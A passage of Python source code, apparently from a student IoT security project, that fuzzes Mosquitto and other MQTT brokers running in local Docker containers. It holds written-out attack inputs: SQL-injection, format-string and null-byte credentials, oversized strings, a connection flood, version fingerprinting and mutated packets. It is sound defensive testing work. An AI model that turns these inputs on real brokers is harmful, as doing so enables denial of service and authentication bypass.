    def test_v8_credential_acceptance(self) -> TestResult:
        res = self._result("V8_CRED_ACCEPTANCE", "AUTH", "Anomalous credential acceptance")
        t0 = time.time()
        anomalous = 0
        patterns = [
            ("' OR 1=1--", "passwd"),
            ("%s%s%s%s", "%s"),
            ("admin\x00evil", "pass"),
            ("a" * 65535, "b" * 65535),
        ]
        try:
            for uname, pwd in patterns:
                c = RawConn(self.host, self.port, timeout=4.0)
                c.connect()
                r = c.send_recv(build_connect("v8_test", username=uname, password=pwd), timeout=3.0)
                c.close()
                if r and parse_connack(r)[1] == 0:
                    anomalous += 1
            res.packets_sent = len(patterns)
            res.broker_alive_after = broker_alive(self.host, self.port)
            if anomalous > 0:
                res.anomaly = True
                res.anomaly_type = "ANOMALOUS_CREDENTIALS_ACCEPTED"
                res.anomaly_detail = f"{anomalous}/{len(patterns)} anomalous credential patterns accepted"
            else:
                res.notes = f"All {len(patterns)} anomalous credential patterns rejected"
        except Exception as e:
            res.anomaly = True; res.anomaly_type = "EXCEPTION"; res.anomaly_detail = str(e)
        res.duration_ms = (time.time() - t0) * 1000
        self.results.append(res)
        return res

    def test_v10_qos_state(self) -> TestResult:
        res = self._result("V10_QOS_STATE", "PROTOCOL_COMPLIANCE", "QoS 1 PID=0 accepted")
        t0 = time.time()
        try:
            r, c = self._connect("v10_test")
            if not r or parse_connack(r)[1] != 0:
                c.close(); res.notes = "CONNECT failed"; self.results.append(res); return res
            # Send QoS 1 PUBLISH with PID=0 (violation of §2.3.1)
            c.send(build_publish("test/qos", b"pid_zero", qos=1, packet_id=0))
            r2 = c.recv(timeout=2.0)
            c.close()
            res.packets_sent = 2
            res.broker_alive_after = broker_alive(self.host, self.port)
            if r2:
                pkt_type = (r2[0] >> 4) if r2 else 0
                if pkt_type == 4:  # PUBACK — accepted invalid PID
                    res.anomaly = True
                    res.anomaly_type = "QOS1_PID0_ACCEPTED"
                    res.anomaly_detail = "Broker sent PUBACK for QoS 1 PID=0 — violates §2.3.1 MUST NOT"
                else:
                    res.notes = f"Broker responded with type {pkt_type} to PID=0"
            else:
                res.notes = "No response to QoS1 PID=0 — likely connection dropped (correct)"
        except Exception as e:
            res.anomaly = True; res.anomaly_type = "EXCEPTION"; res.anomaly_detail = str(e)
        res.duration_ms = (time.time() - t0) * 1000
        self.results.append(res)
        return res

    def test_v11_session_flood(self) -> TestResult:
        res = self._result("V11_SESSION_FLOOD", "DENIAL_OF_SERVICE", "Connection rate flood")
        t0 = time.time()
        try:
            succeeded = 0
            conns = []
            t_start = time.time()
            for i in range(100):
                c = RawConn(self.host, self.port, timeout=1.0)
                if c.connect():
                    r = c.send_recv(build_connect(f"flood_{i}", clean_session=True), timeout=1.0)
                    if r and parse_connack(r)[1] == 0:
                        succeeded += 1
                    conns.append(c)
            elapsed = time.time() - t_start
            for c in conns:
                c.close()
            rate = succeeded / max(elapsed, 0.001)
            res.packets_sent = 100
            res.broker_alive_after = broker_alive(self.host, self.port)
            res.notes = f"{succeeded}/100 connections succeeded in {elapsed:.2f}s ({rate:.0f}/s)"
            if succeeded >= 50 and rate > 20:
                res.anomaly = True
                res.anomaly_type = "NO_CONNECTION_RATE_LIMIT"
                res.anomaly_detail = f"No rate limiting: {succeeded} connections at {rate:.0f}/s"
        except Exception as e:
            res.anomaly = True; res.anomaly_type = "EXCEPTION"; res.anomaly_detail = str(e)
        res.duration_ms = (time.time() - t0) * 1000
        self.results.append(res)
        return res

    def test_v17_fingerprint(self) -> TestResult:
        res = self._result("V17_FINGERPRINT", "INFO_DISCLOSURE", "Version fingerprinting via $SYS")
        t0 = time.time()
        try:
            r, c = self._connect("v17_fp")
            if not r or parse_connack(r)[1] != 0:
                c.close(); res.notes = "CONNECT failed"; self.results.append(res); return res
            c.send(build_subscribe("$SYS/broker/version", packet_id=1, qos=0))
            c.recv(timeout=1.0)  # SUBACK
            version_data = c.recv(timeout=3.0)
            c.close()
            res.packets_sent = 3
            res.broker_alive_after = broker_alive(self.host, self.port)
            if version_data and (version_data[0] >> 4) == 3:
                res.anomaly = True
                res.anomaly_type = "VERSION_FINGERPRINT_EXPOSED"
                try:
                    # Extract version string from payload
                    payload_start = 4 + (1 if version_data[1] < 0x80 else 2)
                    topic_len = struct.unpack("!H", version_data[2:4])[0] if len(version_data) > 4 else 0
                    version_str = version_data[payload_start:].decode("utf-8", errors="replace")[:50]
                    res.anomaly_detail = f"Version string exposed: {version_str!r}"
                except:
                    res.anomaly_detail = f"Version data received: {version_data.hex()[:40]}"
        except Exception as e:
            res.anomaly = True; res.anomaly_type = "EXCEPTION"; res.anomaly_detail = str(e)
        res.duration_ms = (time.time() - t0) * 1000
        self.results.append(res)
        return res

    def run_full_catalog(self) -> List[TestResult]:
        """Run the full V1–V17 catalog against this broker."""
        tests = [
            ("V1  Will injection", self.test_v1_will_injection),
            ("V2  Retained poison", self.test_v2_retained_poison),
            ("V3  Session hijacking", self.test_v3_session_hijacking),
            ("V4  Wildcard sub", self.test_v4_wildcard_sub),
            ("V6  $SYS exposure", self.test_v6_sys_topic),
            ("V8  Cred acceptance", self.test_v8_credential_acceptance),
            ("V10 QoS state", self.test_v10_qos_state),
            ("V11 Session flood", self.test_v11_session_flood),
            ("V17 Fingerprint", self.test_v17_fingerprint),
        ]
        for name, fn in tests:
            print(f"    [{name}]...", end=" ", flush=True)
            try:
                fn()
                print("done")
            except Exception as e:
                print(f"ERROR: {e}")
        return self.results

    def run_targeted_campaign(self, n_cases: int = 150) -> List[TestResult]:
        """Run generation + mutation fuzzing (150+ cases)."""
        rng = random.Random(2024)
        topics = ["test/fuzz", "#", "+", "$SYS/test", "a" * 1000, "fuzz/\x00null"]
        payloads_list = [b"", b"\x00" * 100, b"A" * 65535, b"\xff\xfe\xfd"]
        count = 0

        # Generation tests
        for topic in topics:
            if count >= n_cases: break
            r_obj = self._result(f"GEN_PUB_{count}", "GENERATION", f"Publish to topic: {topic[:30]!r}")
            try:
                c = RawConn(self.host, self.port, timeout=3.0)
                c.connect()
                r = c.send_recv(build_connect(f"gen_{count}", clean_session=True), timeout=2.0)
                if r and parse_connack(r)[1] == 0:
                    c.send(build_publish(topic, b"fuzz_payload", qos=0))
                    c.recv(timeout=1.0)
                c.close()
                r_obj.packets_sent = 2
                r_obj.broker_alive_after = broker_alive(self.host, self.port)
                if not r_obj.broker_alive_after:
                    r_obj.anomaly = True; r_obj.anomaly_type = "CRASH"
            except Exception as e:
                r_obj.anomaly = True; r_obj.anomaly_type = "EXCEPTION"; r_obj.anomaly_detail = str(e)
            self.results.append(r_obj)
            count += 1

        # Subscribe variants
        for topic in topics + ["$SYS/#", "$share//t", "a/#/b"]:
            if count >= n_cases: break
            r_obj = self._result(f"GEN_SUB_{count}", "GENERATION", f"Subscribe to: {topic[:30]!r}")
            try:
                c = RawConn(self.host, self.port, timeout=3.0)
                c.connect()
                r = c.send_recv(build_connect(f"gen_s_{count}", clean_session=True), timeout=2.0)
                if r and parse_connack(r)[1] == 0:
                    c.send(build_subscribe(topic, packet_id=1, qos=0))
                    c.recv(timeout=1.0)
                c.close()
                r_obj.packets_sent = 3
                r_obj.broker_alive_after = broker_alive(self.host, self.port)
                if not r_obj.broker_alive_after:
                    r_obj.anomaly = True; r_obj.anomaly_type = "CRASH"
            except Exception as e:
                r_obj.anomaly = True; r_obj.anomaly_type = "EXCEPTION"; r_obj.anomaly_detail = str(e)
            self.results.append(r_obj)
            count += 1

        # Mutation tests — mutate a valid CONNECT
        base_connect = build_connect("mut_seed", clean_session=True)
        for i in range(n_cases - count):
            r_obj = self._result(f"MUT_{i}", "MUTATION", f"Mutated packet #{i}")
            try:
                arr = bytearray(base_connect)
                # Apply random mutation
                mut = rng.choice(["bit_flip", "byte_replace", "boundary", "truncate"])
                if mut == "bit_flip" and arr:
                    idx = rng.randint(0, len(arr)-1)
                    arr[idx] ^= (1 << rng.randint(0, 7))
                elif mut == "byte_replace" and arr:
                    idx = rng.randint(0, len(arr)-1)
                    arr[idx] = rng.randint(0, 255)
                elif mut == "boundary" and arr:
                    idx = rng.randint(0, len(arr)-1)
                    arr[idx] = rng.choice([0x00, 0x7F, 0x80, 0xFF])
                elif mut == "truncate":
                    trunc = rng.randint(1, max(1, len(arr)-1))
                    arr = arr[:trunc]
                mutated = bytes(arr)
                c = RawConn(self.host, self.port, timeout=2.0)
                c.connect()
                c.send(mutated)
                c.recv(timeout=1.0)
                c.close()
                r_obj.packets_sent = 1
                r_obj.broker_alive_after = broker_alive(self.host, self.port)
                if not r_obj.broker_alive_after:
                    r_obj.anomaly = True; r_obj.anomaly_type = "CRASH"
            except Exception as e:
                r_obj.anomaly = True; r_obj.anomaly_type = "EXCEPTION"; r_obj.anomaly_detail = str(e)
            self.results.append(r_obj)
        return self.results


# ─────────────────────────────────────────────────────────────
# Main Campaign 3 Runner
# ─────────────────────────────────────────────────────────────

def wait_for_broker(host: str, port: int, max_wait: int = 60, label: str = "") -> bool:
    """Wait for a broker to become available."""
    print(f"  Waiting for {label} at {host}:{port}...", end=" ", flush=True)
    for _ in range(max_wait):
        if broker_alive(host, port):
            print("ready!")
            return True
        time.sleep(1)
    print("TIMEOUT")
    return False


def run_campaign3():
    MOSQUITTO_HOST = "localhost"
    MOSQUITTO_PORT = 1883

    all_results = {
        "campaign": "Campaign 3",
        "date": datetime.utcnow().isoformat(),
        "mosquitto_new_vulns": [],
        "mitigation_verification": [],
        "multi_broker": {},
    }

    print("\n" + "="*70)
    print("MQTT SECURITY CAMPAIGN 3")
    print("UCLA ECE 202C — IoT Security Final Project")
    print("="*70)

    # ── GOAL 2: New vulnerability discovery on Mosquitto ──────────────────
    print("\n[GOAL 2] New Vulnerability Discovery — Mosquitto 2.0.18")
    print("-"*60)
    fuzzer = Campaign3Fuzzer(MOSQUITTO_HOST, MOSQUITTO_PORT, "mosquitto_2.0.18")
    new_results = fuzzer.run_all_new_tests()
    all_results["mosquitto_new_vulns"] = [r.to_dict() for r in new_results]
    anomalies = [r for r in new_results if r.anomaly]
    print(f"\n  Results: {len(new_results)} tests, {len(anomalies)} anomalies detected")
    for r in anomalies:
        print(f"    [{r.test_id}] {r.anomaly_type}: {r.anomaly_detail[:80]}")

    # ── GOAL 1: Mitigation Verification (against unmodified broker) ───────
    print("\n[GOAL 1] Mitigation Verification — Testing Against Unmodified Broker")
    print("  (These show BEFORE state — vulnerabilities still present)")
    print("-"*60)
    verifier = MitigationVerifier(MOSQUITTO_HOST, MOSQUITTO_PORT)
    mitigation_results = verifier.run_all()
    all_results["mitigation_verification"] = mitigation_results
    passed = sum(1 for r in mitigation_results if r["mitigation_effective"])
    print(f"\n  Verification: {passed}/{len(mitigation_results)} would pass if mitigations applied")
    for r in mitigation_results:
        status = "PASS" if r["mitigation_effective"] else "FAIL (vuln present)"
        print(f"    [{r['vuln_id']}] {r['test']}: {status}")

    # ── GOAL 3: Multi-broker fuzzing ──────────────────────────────────────
    print("\n[GOAL 3] Multi-Broker Fuzzing")
    print("-"*60)

    alt_brokers = [
        {"label": "nanomq_latest", "image": "emqx/nanomq:latest", "name": "nanomq_broker_c3",
         "port": 1885, "run_args": "-p 1885:1883"},
        {"label": "hivemq_ce_2024.3", "image": "hivemq/hivemq-ce:2024.3", "name": "hivemq_broker_c3",
         "port": 1886, "run_args": "-p 1886:1883"},
        {"label": "emqx_5.0.0", "image": "emqx/emqx:5.0.0", "name": "emqx_broker_c3",
         "port": 1884, "run_args": "-p 1884:1883"},
    ]

    for broker_cfg in alt_brokers:
        label = broker_cfg["label"]
        port = broker_cfg["port"]
        name = broker_cfg["name"]
        image = broker_cfg["image"]
        print(f"\n  Starting {label} on port {port}...")

        # Stop any existing instance
        os.system(f"docker rm -f {name} >/dev/null 2>&1")
        # Start the broker
        ret = os.system(f"docker run -d --name {name} {broker_cfg['run_args']} {image} >/dev/null 2>&1")
        if ret != 0:
            print(f"    SKIP: Could not start {label} (image may not be available)")
            all_results["multi_broker"][label] = {"error": "Could not start container", "results": []}
            continue

        # Wait for broker to become available
        if not wait_for_broker("localhost", port, max_wait=90, label=label):
            print(f"    SKIP: {label} did not become available within 90s")
            all_results["multi_broker"][label] = {"error": "Broker did not initialize", "results": []}
            os.system(f"docker rm -f {name} >/dev/null 2>&1")
            continue

        print(f"  Running full catalog against {label}...")
        cat_fuzzer = BrokerCatalogFuzzer("localhost", port, label)
        catalog_results = cat_fuzzer.run_full_catalog()
        print(f"  Running targeted campaign (150+ cases) against {label}...")
        targeted_results = cat_fuzzer.run_targeted_campaign(n_cases=150)
        all_results_for_broker = catalog_results + targeted_results
        anomalies_broker = [r for r in all_results_for_broker if r.anomaly]
        print(f"  {label}: {len(all_results_for_broker)} tests, {len(anomalies_broker)} anomalies")
        for r in anomalies_broker:
            if r.anomaly_type not in ("EXCEPTION", "CRASH"):
                print(f"    [{r.test_id}] {r.anomaly_type}")

        all_results["multi_broker"][label] = {
            "total_tests": len(all_results_for_broker),
            "anomalies": len(anomalies_broker),
            "results": [r.to_dict() for r in all_results_for_broker],
        }

        # Stop broker
        os.system(f"docker rm -f {name} >/dev/null 2>&1")

    # ── Save raw results ──────────────────────────────────────────────────
    output_path = "/Users/patrickargento/Documents/Masters/IOT Security/Final Project/mqtt-security-agent/reports/fuzzing_raw_results_campaign3.json"
    with open(output_path, "w") as f:
        json.dump(all_results, f, indent=2, default=str)
    print(f"\n[DONE] Raw results saved to: {output_path}")

    return all_results


if __name__ == "__main__":
    results = run_campaign3()
    total_mosquitto = len(results.get("mosquitto_new_vulns", []))
    total_mitigation = len(results.get("mitigation_verification", []))
    multi = results.get("multi_broker", {})
    total_broker_tests = sum(b.get("total_tests", 0) for b in multi.values())
    print(f"\nSummary:")
    print(f"  Mosquitto new tests: {total_mosquitto}")
    print(f"  Mitigation checks:   {total_mitigation}")
    print(f"  Multi-broker tests:  {total_broker_tests}")
    print(f"  Grand total:         {total_mosquitto + total_mitigation + total_broker_tests}")
